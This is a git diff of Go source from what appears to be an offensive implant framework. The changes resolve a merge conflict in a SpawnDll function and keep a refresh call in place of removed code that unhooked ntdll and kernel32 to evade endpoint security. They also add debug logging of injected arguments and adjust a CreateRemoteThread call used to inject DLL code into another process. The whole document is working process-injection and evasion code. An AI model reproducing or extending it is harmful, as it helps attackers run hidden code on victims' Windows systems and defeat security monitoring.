@@ -244,31 +244,9 @@ func ExecuteAssembly(hostingDll, assembly []byte, process, params string, timeou
 }
 
 func SpawnDll(procName string, data []byte, offset uint32, args string) (string, error) {
-<<<<<<< HEAD
 	err := refresh()
 	if err != nil {
 		return "", err
-=======
-	var err error
-	// Hotfix for #114
-	// Somehow this fucks up everything on Windows 8.1
-	// so we're skipping the evasion.RefreshPE calls.
-	if version.GetVersion() != "6.3 build 9600" {
-		err = evasion.RefreshPE(ntdllPath)
-		if err != nil {
-			//{{if .Debug}}
-			log.Printf("evasion.RefreshPE on ntdll failed: %v\n", err)
-			//{{end}}
-			return "", err
-		}
-		err = evasion.RefreshPE(kernel32dllPath)
-		if err != nil {
-			//{{if .Debug}}
-			log.Printf("evasion.RefreshPE on kernel32 failed: %v\n", err)
-			//{{end}}
-			return "", err
-		}
->>>>>>> evasion
 	}
 	var stdoutBuff bytes.Buffer
 	var stderrBuff bytes.Buffer
@@ -289,6 +267,9 @@ func SpawnDll(procName string, data []byte, offset uint32, args string) (string,
 	dataAddr, err := allocAndWrite(data, handle, uint32(len(data)))
 	argAddr := uintptr(0)
 	if len(args) > 0 {
+		//{{if .Debug}}
+		log.Printf("Args: %s\n", args)
+		//{{end}}
 		argsArray := []byte(args)
 		argAddr, err = allocAndWrite(argsArray, handle, uint32(len(argsArray)))
 		if err != nil {
@@ -411,7 +392,7 @@ func protectAndExec(handle windows.Handle, startAddr uintptr, threadStartAddr ui
 	//{{if .Debug}}
 	log.Printf("Starting thread at 0x%08x\n", startAddr)
 	//{{end}}
-	threadHandle, err = syscalls.CreateRemoteThread(handle, attr, 0, threadStartAddr, uintptr(argAddr), 0, &lpThreadId)
+	threadHandle, err = syscalls.CreateRemoteThread(handle, attr, 0, threadStartAddr, argAddr, 0, &lpThreadId)
 	if err != nil {
 		return
 	}
